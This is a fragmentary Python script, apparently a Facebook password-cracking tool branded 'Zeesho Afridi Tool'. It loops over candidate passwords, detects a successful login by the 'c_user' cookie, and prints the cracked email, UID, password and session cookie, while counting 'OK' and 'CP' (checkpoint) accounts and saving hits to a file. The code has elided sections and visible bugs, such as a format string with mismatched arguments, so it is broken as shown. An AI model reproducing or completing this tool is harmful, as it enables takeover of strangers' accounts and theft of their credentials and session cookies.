...
AUTHOR    : Zeesho Afridi Tool 
FACEBOOK : Zeesho Afridi 
Welcome To My World 
                                   [THE DEAD USER]
...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mZeesho-OK.txt' % (
            H, P, str(len(oks))))
...
def xyz():
    ...
    print(f"")
    print(f"[01] {YELLOW}Zeesho Afridi")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[âˆš]---------------------[Zeesho-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Zeesho] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
